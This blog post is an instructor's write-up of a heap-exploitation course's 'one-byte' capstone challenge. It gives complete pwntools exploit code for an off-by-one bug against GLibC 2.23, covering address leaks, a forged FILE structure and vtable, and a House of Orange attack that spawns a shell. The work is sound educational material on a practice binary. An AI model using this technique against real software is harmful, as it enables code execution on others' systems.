---
layout: post
description: One-byte challenge post
comments: true
date: 2024-09-02
last-update: 22024-09-02
---

One of my students, after reviewing their graded exam, expressed disagreement with a slightly lower mark. The deduction stemmed from an imprecise calculation and rough approach, in a stack-based buffer overflow exploit.
This incident brought to mind the challenges I encountered while delving into the complexities of GLibC exploitation. To illustrate this point further, I've decided to showcase a particularly intricate exploit known as "House of Orange.

## Table of content

- [Exploiting heap-based buffer overflow - The One-Byte challenge](#exploiting-heap-based-buffer-overflow---the-one-byte-challenge)
  - [Acknowledgement](#acknowledgement)
- [The challenge](#the-challenge)
  - [Examining the binary](#examining-the-binary)
  - [The bug](#the-bug)
- [Exploiting one\_byte and GLibC 2.23](#exploiting-one_byte-and-glibc-223)
- [The complete step-by-step exploit](#the-complete-step-by-step-exploit)
  - [Step 1, leak GLibC and heap addresses](#step-1-leak-glibc-and-heap-addresses)
  - [Step 2 - Configure the heap for the House of Orange](#step-2---configure-the-heap-for-the-house-of-orange)
  - [Step 3 - Trigger the exploit!](#step-3---trigger-the-exploit)
- [Other things that I have tried](#other-things-that-i-have-tried)
  - [Attacking Fastbins](#attacking-fastbins)

# Exploiting heap-based buffer overflow - The One-Byte challenge

One of my students, after reviewing their graded exam, expressed disagreement with a slightly lower mark. The deduction stemmed from an imprecise calculation and rough approach, in a stack-based buffer overflow exploit.

This experience underscored a potential disconnect between my expectations and the student's understanding. I believe that my emphasis on precision in exploit development might not have been adequately communicated, leading the student to underestimate its importance. It's a reminder that I need to be more explicit in explaining why meticulousness is crucial, especially when it comes to learning and demonstrating proficiency in binary exploitation techniques: ***I only teach the basics of binary exploitation, and students who want to pursue some careers in cybersecurity might have to learn much more to be effective at researching vulnerabilities and using or developing exploits.*** So it's important to deeply understand the foundational concept and the importance of being precise.

This incident brought to mind the challenges I encountered while delving into the complexities of GLibC exploitation. To illustrate this point further, I've decided to showcase a particularly intricate exploit known as "House of Orange."

This example should shed light on the necessity for precision and the potential consequences of even minor inaccuracies in this field. Moreover, the bug we leverage to break this challenge is literally based on a programming mistake on imprecise length of just one single byte...

## Acknowledgement

This post details my approach to cracking the "capstone" project binary for part one of Max Kamper's [`Linux Heap Exploitation course`](https://www.udemy.com/course/linux-heap-exploitation-part-1).

I can't recommend this course highly enough. When it comes to GLibC and heap exploitation in general, Max is one of the most knowledgeable people I've encountered. He's also a dedicated and gifted teacher.

If you are into binary exploitation, buy Max's course, you won't be disappointed!

# The challenge

The goal of this challenge is to spawn a shell from the challenge application.

We are given an ELF executable named "one-byte". When executed, this application presents a menu with 5 possible options:

```bash
===============
|   HeapLAB   |  CHALLENGE: One-Byte
===============

1) malloc 0/16
2) free
3) edit
4) read
5) quit
```

The first choice allows allocating 88 bytes of memory on the heap (`0x58` bytes). This function can be called ***up to 16 times***, with each memory request incrementing an index.

Option 2 enables the user to free the memory allocated in the first option by prompting for the index of the memory block to be released.

Option 3 also requires an index input and allows for the editing of the selected block's content.

Option 4 permits the reading of the content of a block by index, returning exactly `0x58` bytes.

Finally, option 5 allows for the program to be exited.

Upon launching the binary via GDB, we learn that the memory allocation is performed using `calloc()`. This ensures that the memory is zeroed before being returned to the user.

## Examining the binary

The one-byte binary has all the modern protections enabled (Full REL-RO, NX, stack canary, and the executable is a PIE):

```other
❯ checksec ./one_byte
[*] '/home/ubuntu/HeapLAB/challenge-one_byte/one_byte'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'../.glibc/glibc_2.23'
```

We learn that one-byte is dynamically linked against GLibC version 2.23, which has been released in 2016.

> Just looking at the GLibC version, we know that the malloc implementation lacks some integrity checks introduced in more recent versions on to mitigate attacks like the unsortedbin attack and fastbin dup.

## The bug

Identifying the core issue with one-byte was relatively easy. The name kind of gave it away.

With the help of GDB, I noticed that option number 3 allows us to write `0x59` bytes of memory in a chunk, while the memory available to the user is only `0x58` bytes (out of a chunk with a total of `0x60` bytes).

On a little endian architecture, such as x86_64, this capability enables us to manipulate the least significant byte of the size of chunk that follows.

![Image.png]({{ '/' | absolute_url }}assets/images/one-byte/0_0-01.png)

> ***Note:*** The bug allows us to tamper with the top chunk size, but since we can only change the least significant byte this won’t lead us anywhere.

Since this challenge is the "capstone" project for the part one of the [`Linux Heap Exploitation course`](https://www.udemy.com/course/linux-heap-exploitation-part-1), I focused on the topics covered by the course:

- ***House of Force***, which I excluded immediately as per the note above.
- ***Fastbin dup***, which I excluded since the binary doesn't suffer from a double-free vulnerability and because of the considerations I explain in the "Other things that I have tried" section.
- ***Unsafe unlink*** wasn't available given the version of GLibC in use.
- ***Safe unlink*** wasn't also viable as I couldn't find a way to leak the stack address.
- Unsortedbin attack and the House of Orange, which looked promising.

# Exploiting one_byte and GLibC 2.23

To exploit the binary we will use Python with pwntools. To simplify the interaction with the binary, I leveraged the pwntools template created for this challenge.

You can safely skip over this part, just note that the python functions I am using in the rest of the article are helpers selecting the corresponding option from the one-byte application menu and sending/receiving parameters and output as appropriate. The names of these function should be self-explanatory, but you can refer to the following snippet, when needed.

```python
#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("one_byte")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option.
# Returns chunk index.
def malloc():
    global index
    io.sendthen(b"> ", b"1")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Select the "read" option; read 0x58 bytes.
def read(index):
    io.send(b"4")
    io.sendafter(b"index: ", f"{index}".encode())
    r = io.recv(0x58)
    io.recvuntil(b"> ")
    return r

io = start()
io.recvuntil(b"> ")
io.timeout = 0.1
```

# The complete step-by-step exploit

There are 3 main steps for this exploit.

**Leak useful information**: since we need to assume that ASLR is enabled (and the default, modern, security measures are also enabled for the binary), we need to leak some addresses. Specifically, as we will see later, we need the heap and GLibC addresses.

**Prepare the heap for the House of Orange**: after tinkering with the executable, and for the considerations I explained above, I determined that House of Orange was the most viable exploitation strategy. Nevertheless, I couldn't use it as it was presented in the course, so some investigation and preparation was needed.

**Profit**: trigger the exploit.

> ***Note:*** My exploitation of the one-byte challenge differs from the one presented as the "official" solution for the challenge. This is due to the approach used for leaking the GLibC and heap address.

## Step 1, leak GLibC and heap addresses

We allocate a total of 5 chunks. The first 3 are used to leak GLibC and heap addresses. We would need an additional one to prevent consolidation with the top chunk, but here we add 2 more. The need for them will be clear later.

```python
chunk_00 = malloc()
chunk_01 = malloc() # We will reshape this one
chunk_02 = malloc() # Overlaps the fake chunk above
chunk_03 = malloc() # Spacer chunk
chunk_vt = malloc() # This will be our fake vtable.
```

Leveraging the off-by-one bug, we resize `chunk_01` from `0x60` to `0xc0` bytes (`0xc1`, as we need to account for the `prev_inuse` flag).

```python
# Create a fake 0xc0 bytes chunk
edit(chunk_00, b"\x00"*0x58 + p8(0xc1))
```

After the above operations, the heap will look like in the following picture:

![Image.png]({{ '/' | absolute_url }}assets/images/one-byte/0_0-02.png)

Now we free `chunk_01`, to get a `0xc0` chunk in the unsortedbin.

```python
# Add a 0xc0 chunk in unsortedbin
free(chunk_01)
```

Note that `chunk_02` is still accessible:

![Image.png]({{ '/' | absolute_url }}assets/images/one-byte/0_0-03.png)

Allocating a new `0x60` bytes chunk, causes `chunk_01` to be sorted in the `0xc0` smallbin and, since no exact fit exists anywhere, it is also remaindered. The bottom half (a `0x60` bytes chunk) is linked in the unsortedbin list, while the top half is returned to the user. As per following snippet, we store its index in `chunk_04`.

```python
# Cause a 0x60 reminder to be created, this reminder will overlap chunk_02
chunk_04 = malloc()
```

The heap configuration we obtain, as you can see below, allows us to read from `chunk_02` the unsortedbin list pointers to the `main_arena`:

![Image.png]({{ '/' | absolute_url }}assets/images/one-byte/0_0-04.png)

The following snipped shows how we can get the base address of GLibC.

```python
# Leak the unsortedbin head address from reminter chunk's fd pointer
leak = read(chunk_02)
unsortedbin = u64(leak[:8])
print(f"Leaked unsortedbin bk address: 0x{unsortedbin:02x}")
# The unsortedbin head starts 0x58 bytes into the main arena
libc.address = unsortedbin - 0x58 - libc.sym.main_arena
print(f"Leaked libc adress:            0x{libc.address:02x}")
```

Now we also need to leak the heap address. The reason will be clear later, but since we are pursuing the House of Orange exploit, we know that we need to forge a fake filestream on the heap, and we need its address.

The strategy I use to leak the heap addressing is to coerce malloc into linking an additional chunk in the unsortedbin (remember that the remainder of `chunk_01` is already in that list).

To do so, we leverage off-by-one again, resizing `chunk_04`:

```python
# chunk_04 is right below chunk_00, so we can do our off-by-one again
edit(chunk_00, b"\x00"*0x58 + p8(0xc1))
```

The above snippet leads us to the following configuration:

![Image.png]({{ '/' | absolute_url }}assets/images/one-byte/0_0-05.png)

To replicate the same mechanism we used before to get a chunk in the unsortedbin, we need to fix the flags for `chunk_03`. In fact, at this point, `chunk_03` thinks that the previous chunk is free, and that would lead to a double free malloc error when we release `chunk_04`.

To avoid that, we simply leverage once again the off-by-one bug, carefully rewriting the unsortedbin head address in the `fd` and `bk` pointers, to avoid memory corruption, as follows:

```python
# chunk_03 thinks that the previous chunk is free. To avoid memory corruption
# we need to leverage off-by-one and change the flags. In the process we need
# to re-write the fd and bk pointers we just leaked.
edit(chunk_02, p64(unsortedbin) + p64(unsortedbin) + b"\x02"*0x48 + p8(0x61))
```

![Image.png]({{ '/' | absolute_url }}assets/images/one-byte/0_0-06.png)

Freeing `chunk_04` now produces the desired effect:

```python
# Add another 0xc0 chunk in unsortedbin
# This will set chunk_02's bk to the address of chunk_04
free(chunk_04)
```

The following picture shows the configuration of our heap after freeing `chunk_04`:

![Image.png]({{ '/' | absolute_url }}assets/images/one-byte/0_0-07.png)

We now have 2 chunks in the unsortedbin. The `bk` pointer we can read from `chunk_02` (aka `unsortedbin[1]`) holds the address of `unsortedbin[0]` which is on the heap and for which we know the offset from the beginning of the heap.

Calculating the heap base address is now trivial:

```python
# This time chunk_02 also has the heap address
leak = read(chunk_02)
# Leak the address of chunk_04
chunk_04_address = u64(leak[8:16])
heap = chunk_04_address - 0x60
print(f"Leaked heap address:           0x{heap:02x}")
```

## Step 2 - Configure the heap for the House of Orange

Before preparing the heap for the House of Orange, we need to clean up after ourselves.

We still need a chunk in the unsortedbin, for the unsortedbin attack part, so we issue only 2 memory allocations.

```python
# "reset" the heap, prepping for the House of Orange
chunk_05 = malloc()
chunk_06 = malloc()
```

![Image.png]({{ '/' | absolute_url }}assets/images/one-byte/0_0-08.png)

We can now focus on preparing the fake filestream.

The strategy is to coerce malloc into sorting the chunk pointed by `unsortedbin[0]` into the `0xb0` smallbin. This is because empirically we learned that at the second iteration of `_IO_list_all` traversal, the `0xb0` smallbin pointer is exactly overlapping the `_chain` pointer of the `FILE` struct.

The following output is available when the final exploit is triggered. It shows that the third filestream in `_IO_list_all` overlaps `0xb0` smallbin `bt` pointer in the main arena. That is the 22nd `mchunkptr` element of `main_arena.bins`:

```other
pwndbg> p &(struct _IO_FILE_plus*)_IO_list_all.file._chain._chain
$1 = (struct _IO_FILE_plus **) 0x7ffff7b99c30 <main_arena+272>             <--- HERE
pwndbg> p &main_arena
$2 = (struct malloc_state *) 0x7ffff7b99b20 <main_arena>
pwndbg> dt "struct malloc_state" 0x7ffff7b99b20
struct malloc_state @ 0x7ffff7b99b20
    0x00007ffff7b99b20 +0x0000 mutex                : mutex_t
    0x00007ffff7b99b24 +0x0004 flags                : int
    0x00007ffff7b99b28 +0x0008 fastbinsY            : mfastbinptr [10]
    0x00007ffff7b99b78 +0x0058 top                  : mchunkptr
    0x00007ffff7b99b80 +0x0060 last_remainder       : mchunkptr
    0x00007ffff7b99b88 +0x0068 bins                 : mchunkptr [254]
    0x00007ffff7b9a378 +0x0858 binmap               : unsigned int [4]
    0x00007ffff7b9a388 +0x0868 next                 : struct malloc_state *
    0x00007ffff7b9a390 +0x0870 next_free            : struct malloc_state *
    0x00007ffff7b9a398 +0x0878 attached_threads     : size_t
    0x00007ffff7b9a3a0 +0x0880 system_mem           : size_t
    0x00007ffff7b9a3a8 +0x0888 max_system_mem       : size_t
pwndbg> p &main_arena.bins[21]
$3 = (mchunkptr *) 0x7ffff7b99c30 <main_arena+272>                         <--- HERE
```

The above also means that `_chain` will point 8 bytes before the size of the chunk pointed by `unsortedbin[0]`. We can access that location by writing into `chunk_06`, as shown below:

```python
# Prepare a fake filestream at the end of chunk_06. This location on the heap
# is where the 2nd iteration following the filestream _chain pointer expects it
# to be
edit(chunk_06, b"\x06" * 0x50 + b"/bin/sh\0" + p8(0xb1))
```

We also need to prepare the fake vtable, which is `0xd8` bytes after the beginning of the filestream, as shown by the `dt` command:

```other
pwndbg> dt "struct _IO_FILE_plus"
struct _IO_FILE_plus
    +0x0000 file                 : _IO_FILE
    +0x00d8 vtable               : const struct _IO_jump_t *
```

```bash
pwndbg> dt "struct _IO_jump_t"
struct _IO_jump_t
    +0x0000 __dummy              : size_t
    +0x0008 __dummy2             : size_t
    +0x0010 __finish             : _IO_finish_t
    +0x0018 __overflow           : _IO_overflow_t
[...]
```

Since we only care about the `__overflow` function, we can get things in the desired shape by only writing to `chunk_vt`.

```python
# Prepare the fake vtable.
# The filestream we are targeting expects vtable pointer to be @ heap + 0x178
# (this is +0xd8 from the beginning of the fake filestream).
# __overflow is invoked with a pointer to the filestream as its only argument,
# which, as per our forged chunk_06, is now "/bin/sh\0"
edit(chunk_vt, p64(libc.sym.system) + p64(heap + 0x178))
```

Note that while the pointer to the vtable must be `0x18` bytes from the beginning of `chunk_vt`, the vtable itself can be in any region of the heap we control. For simplicity, I kept everything inside `chunk_vt` by considering the beginning of the fake vtable to be 8 bytes before the beginning of `chunk_vt`.

The following picture shows the heap configuration we achieved. Our fake filestream starts at the beginning of the `"/bin/sh"` string.

![Image.png]({{ '/' | absolute_url }}assets/images/one-byte/0_0-09.png)

Next, we prepare for the unsortedbin attack, by replacing the `bk` pointer of the `0xb0` chunk in the unsortedbin with the address of `_IO_list_all`. In the process we also make sure that `_IO_write_base` and `_IO_write_ptr` get values that will cause the `__overflow` function to be called. Since `_IO_write_base` should be less than `_IO_write_ptr` we use, respectively, `0x0` and `0x1`

Note that the value of `fd` doesn't matter (it's ignored by the partial unlink performed by malloc for the unsortedbin). I use `0xcafebabe` as a placeholder:

```python
# Preparing the House of Orange attack, while finishing forgin the fake
# filestream with 0x0 for _IO_write_base and 0x1 for _IO_write_ptr. The
# latter will cause _overflow() to be called, since _mode is 0
edit(chunk_02, p64(0xcafebabe) + p64(libc.sym._IO_list_all - 0x10) + p64(0x0)
     + p64(0x1))
```

Right before triggering the exploit, our heap should look like in the following diagram:

![Image.png]({{ '/' | absolute_url }}assets/images/one-byte/0_0-10.png)

## Step 3 - Trigger the exploit!

Finally, we can trigger the House of Orange!

```python
# Trigger house of Orange and drop a shell.
malloc()
```

> ***Note:*** When attempted in production conditions, this exploit is not 100% reliable and need to be attempted multiple times. This is due to ASLR and specifically to the value the `_mode` field of `_IO_FILE` struct will get.

```bash
❯ ./xpl-nopause.py
[*] '/home/ubuntu/HeapLAB/challenge-one_byte/one_byte'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'../.glibc/glibc_2.23'
[*] '/home/ubuntu/HeapLAB/.glibc/glibc_2.23/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Starting local process '/home/ubuntu/HeapLAB/challenge-one_byte/one_byte'
[+] Starting local process '/home/ubuntu/HeapLAB/challenge-one_byte/one_byte': pid 1551
Leaked unsortedbin bk address: 0x7f4dbe399b78
Leaked libc adress:            0x7f4dbe000000
Leaked heap address:           0x61ba09ddb000
[*] Switching to interactive mode
*** Error in `/home/ubuntu/HeapLAB/challenge-one_byte/one_byte': malloc(): memory corruption: 0x00007f4dbe39a520 ***
$ whoami
ubuntu
```

# Other things that I have tried

## Attacking Fastbins

Creating `0x60` bytes reminder chunks allows us to free chunks that will end up in the `0x60` fastbin while we can read and write its content. That means we can add a `fd` pointer to arbitrary data and have malloc returning an arbitrary region of memory.

The caveat is that that region need to be within a fake chunk with a compatible size field. This is the same limitation we have for the fastbin dup attack.

As it turns out, using pwndbg’s `find_fake_fast`, the areas we are interested in (i.e., malloc hooks, filestream, or filestream `vtable`) are only suitable with `0x7X` chunks that we aren’t able to use with the binary we want to exploit.

For the curious, we could get `0x7X` bytes chunks in the corresponding fastbin, by:

1. changing the length of our victim chunk to `0x60`+`0x70` bytes;
2. freeing this fake chunk;
3. allocating 2 `0x60` chunk, and receiving for the second allocation the `0x70` by exhaustion of a reminder chunk;
4. freeing the `0x70` chunk.

Unfortunately, since malloc always allocates only by exact size match from fastbins, there is no way we can claim that memory back to follow the `fd` pointers and get the target memory region on the heap or GLibC.
